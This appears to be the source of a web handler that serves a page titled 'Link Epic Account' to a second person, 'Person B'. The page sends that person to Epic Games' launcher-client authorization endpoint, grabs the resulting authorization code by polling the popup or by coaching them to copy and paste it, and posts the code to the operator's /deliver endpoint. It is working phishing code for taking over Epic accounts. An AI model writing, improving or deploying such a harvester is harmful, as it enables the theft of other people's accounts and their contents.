/**
 * GET /pop/:token
 *
 * Person B's page. The flow:
 *  1. Page loads — opens the Epic JSON URL in a new tab (not popup, new tab)
 *  2. Listens for BroadcastChannel messages from /extract/:token
 *  3. Polls popup.location — catches the moment it becomes readable (localhost redirect)
 *  4. If auto-capture fails: shows paste box — user pastes, auto-submits
 *
 * The Epic JSON page (launcherAppClient2) redirects to:
 *   https://localhost/launcher/authorized?code=CODE
 * When that redirect fires, popup.location.href becomes readable briefly
 * because the "connection refused" page has no loaded origin.
 * We catch it in the poll loop.
 *
 * Fallback: user opens epic URL in their tab manually, copies the 32-char
 * authorizationCode, pastes into our input — auto-submits on paste.
 */
import { getSession } from './_db.js';

const LAUNCHER_ID = '34a02cf8f4414e29b15921876da36f9a';

export default async function handler(req, res) {
  const token = String(req.url.split('/pop/')[1] || '').split('?')[0].trim();

  const s = await getSession(token);
  if (!s) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(410).send(`<html><body style="background:#080808;color:#888;font-family:sans-serif;padding:40px;text-align:center">
      <p>Session expired. Ask for a new link.</p></body></html>`);
  }

  const base       = `https://${req.headers.host}`;
  const deliverUrl = `${base}/deliver`;
  const epicUrl    = `https://www.epicgames.com/id/api/redirect?clientId=${LAUNCHER_ID}&responseType=code`;
  const epicLogin  = `https://www.epicgames.com/id/login?redirectUrl=${encodeURIComponent(epicUrl)}`;

  console.log(`[POP] token=${token.slice(0,8)}`);

  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Link Epic Account</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{background:#080808;color:#d0d0d0;font-family:-apple-system,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
    .card{background:#101010;border:1px solid #1e1e1e;border-radius:20px;padding:40px 36px;max-width:460px;width:100%}
    .spinner{width:36px;height:36px;border:3px solid #1e1e1e;border-top-color:#00e676;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto 20px}
    @keyframes spin{to{transform:rotate(360deg)}}
    h2{color:#fff;font-size:1.25em;margin-bottom:8px;text-align:center}
    .sub{color:#555;font-size:0.85em;line-height:1.6;margin-bottom:24px;text-align:center}
    .st{font-size:0.85em;color:#00e676;min-height:20px;margin-bottom:18px;text-align:center}
    .st.err{color:#ff5252}

    /* step cards */
    .steps{display:none;margin-bottom:20px}
    .steps.show{display:block}
    .step{display:flex;align-items:flex-start;gap:12px;margin-bottom:12px;background:#141414;border:1px solid #222;border-radius:10px;padding:12px 14px}
    .sn{width:24px;height:24px;border-radius:50%;background:#0e2a0e;color:#00e676;font-size:0.8em;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
    .st-txt{font-size:0.84em;color:#888;line-height:1.5}
    .st-txt strong{color:#ccc}

    /* paste box */
    .paste-area{display:none;margin-top:4px}
    .paste-area.show{display:block}
    .paste-label{font-size:0.75em;color:#444;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px}
    input{width:100%;background:#161616;border:2px solid #252525;border-radius:10px;color:#fff;padding:13px 14px;font-size:1em;font-family:monospace;outline:none;transition:border .15s;letter-spacing:.04em}
    input:focus{border-color:#00e676}
    input::placeholder{color:#2a2a2a}
    .paste-hint{font-size:0.78em;color:#333;margin-top:6px;text-align:center}

    /* open btn */
    .open-btn{display:none;width:100%;background:#00e676;color:#000;border:none;border-radius:10px;padding:14px;font-size:0.95em;font-weight:700;cursor:pointer;margin-bottom:14px;transition:opacity .15s}
    .open-btn:hover{opacity:.85}
    .open-btn.show{display:block}

    .success{display:none;text-align:center;padding:10px 0}
    .success.show{display:block}
    .success .icon{font-size:2.6em;margin-bottom:12px}
    .success h2{color:#00e676}
    .success p{color:#555;font-size:0.85em;margin-top:8px}
  </style>
</head>
<body>
<div class="card">
  <div id="loadingView">
    <div class="spinner" id="spin"></div>
    <h2>Linking Epic Account</h2>
    <p class="sub" id="subText">Checking your Epic session…</p>
    <div class="st" id="st"></div>

    <button class="open-btn" id="openBtn" onclick="openEpic()">
      Open Epic → Get Code
    </button>

    <div class="steps" id="steps">
      <div class="step">
        <div class="sn">1</div>
        <div class="st-txt">Click <strong>Open Epic → Get Code</strong> above</div>
      </div>
      <div class="step">
        <div class="sn">2</div>
        <div class="st-txt">In the new tab, find <strong>"authorizationCode"</strong> and copy the 32-character value next to it</div>
      </div>
      <div class="step">
        <div class="sn">3</div>
        <div class="st-txt">Paste it in the box below — it submits automatically</div>
      </div>
    </div>

    <div class="paste-area" id="pasteArea">
      <div class="paste-label">Paste code here</div>
      <input type="text" id="ci" placeholder="e.g. 490e1df4d3c14c60ae6834b0cab580e8" maxlength="36" autocomplete="off" autocorrect="off" spellcheck="false">
      <div class="paste-hint">Code expires in ~5 min · paste and it submits automatically</div>
    </div>
  </div>

  <div class="success" id="successView">
    <div class="icon">✅</div>
    <h2>Account Linked!</h2>
    <p>You can close this window.</p>
  </div>
</div>

<script>
const TOKEN       = '${token}';
const DELIVER_URL = '${deliverUrl}';
const EPIC_URL    = '${epicUrl}';
const EPIC_LOGIN  = '${epicLogin}';

let submitted = false;
let popup     = null;
let pollTimer = null;
let stage     = 'init'; // init → tryAuto → manual

function setSt(msg, err) {
  const el = document.getElementById('st');
  el.textContent = msg;
  el.className = 'st' + (err ? ' err' : '');
}

function showSuccess() {
  document.getElementById('loadingView').style.display = 'none';
  document.getElementById('successView').className = 'success show';
}

function showManual() {
  stage = 'manual';
  document.getElementById('spin').style.display = 'none';
  document.getElementById('subText').textContent = 'Follow these steps to link your account:';
  document.getElementById('openBtn').className  = 'open-btn show';
  document.getElementById('steps').className    = 'steps show';
  document.getElementById('pasteArea').className = 'paste-area show';
  setSt('');
  setTimeout(() => document.getElementById('ci').focus(), 100);
}

function extractCode(text) {
  const m = text.match(/"authorizationCode"\\s*:\\s*"([a-f0-9]{32})"/i)
         || text.match(/"code"\\s*:\\s*"([a-f0-9]{32})"/i)
         || text.match(/[?&]code=([a-f0-9]{32})/i)
         || text.match(/authorized[?/].*code=([a-f0-9]{32})/i);
  return m ? m[1] : null;
}

async function deliver(code) {
  if (submitted) return;
  submitted = true;
  if (popup && !popup.closed) popup.close();
  clearInterval(pollTimer);
  setSt('Submitting…');
  try {
    const r = await fetch(DELIVER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: TOKEN, code }),
    });
    const d = await r.json();
    if (d.ok) { showSuccess(); }
    else {
      submitted = false;
      setSt('Error: ' + (d.error || 'unknown') + ' — try a fresh code', true);
      showManual();
    }
  } catch(e) {
    submitted = false;
    setSt('Network error — paste code', true);
    showManual();
  }
}

// ── Auto-capture via popup location polling ─────────────────────────
function tryAutoCapture() {
  stage = 'tryAuto';
  setSt('Attempting auto-capture…');

  const w = 520, h = 680;
  const left = Math.max(0, (screen.width  - w) / 2);
  const top  = Math.max(0, (screen.height - h) / 2);

  popup = window.open(
    EPIC_URL, 'epicauth',
    'width='+w+',height='+h+',left='+left+',top='+top+',toolbar=no,menubar=no,scrollbars=yes,resizable=yes'
  );

  if (!popup || popup.closed) {
    // Popup blocked — go straight to manual
    showManual();
    return;
  }

  setSt('Waiting for Epic…');
  let ticks = 0;

  pollTimer = setInterval(() => {
    ticks++;

    if (!popup || popup.closed) {
      clearInterval(pollTimer);
      if (!submitted && stage === 'tryAuto') {
        // Popup was closed — show manual
        showManual();
      }
      return;
    }

    // ── Try reading location (works when popup navigates to localhost) ──
    let href = null;
    try { href = popup.location.href; } catch (_) {}

    if (href && href !== 'about:blank') {
      console.log('[POLL] href:', href.slice(0, 80));

      // Extract from URL
      let code = extractCode(href);

      // Extract from page body (null-origin error pages may be readable)
      if (!code) {
        try {
          const txt = popup.document?.body?.innerText || '';
          code = extractCode(txt);
          if (code) console.log('[POLL] code from body');
        } catch (_) {}
      }

      if (code) {
        clearInterval(pollTimer);
        deliver(code);
        return;
      }

      // Href is readable but no code — error page / about:blank
      if (
        href.startsWith('https://localhost') ||
        href.startsWith('http://localhost') ||
        href.includes('chrome-error') ||
        href.includes('about:neterror') ||
        href === 'about:blank'
      ) {
        clearInterval(pollTimer);
        setSt('Auto-capture failed — follow the steps below', true);
        showManual();
        return;
      }
    }

    // Timeout after 90s → fall back to manual
    if (ticks > 180) {
      clearInterval(pollTimer);
      if (!submitted) {
        setSt('Timed out — follow the steps below', true);
        showManual();
      }
    }
  }, 500);
}

// ── Manual: user opens Epic tab themselves ───────────────────────────
function openEpic() {
  window.open(EPIC_URL, '_blank');
  setSt('Epic tab opened ↗ — copy the code and paste below');
}

// ── Input: auto-submit on 32-char paste ──────────────────────────────
document.getElementById('ci').addEventListener('input', function() {
  const v = this.value.trim().replace(/[^a-f0-9]/gi, '');
  if (v.length === 32 && !submitted) {
    setSt('Code detected — submitting…');
    setTimeout(() => deliver(v.toLowerCase()), 150);
  }
});

document.getElementById('ci').addEventListener('keydown', function(e) {
  if (e.key === 'Enter') {
    const v = this.value.trim().replace(/[^a-f0-9]/gi, '').toLowerCase();
    if (v.length === 32) deliver(v);
  }
});

// ── Boot ─────────────────────────────────────────────────────────────
// Try auto first, fall back to manual after 2s if popup blocked or no href
tryAutoCapture();
// If popup was blocked (synchronous), showManual was already called.
// Otherwise give it 2s to start, then show manual fallback in parallel
// so the user always has something to do.
setTimeout(() => {
  if (!submitted && stage === 'tryAuto') {
    // Still trying auto — reveal the manual section quietly as backup
    document.getElementById('pasteArea').className = 'paste-area show';
    setSt('Still waiting… or paste the code below if you have it');
  }
}, 4000);
</script>
</body>
</html>`);
}
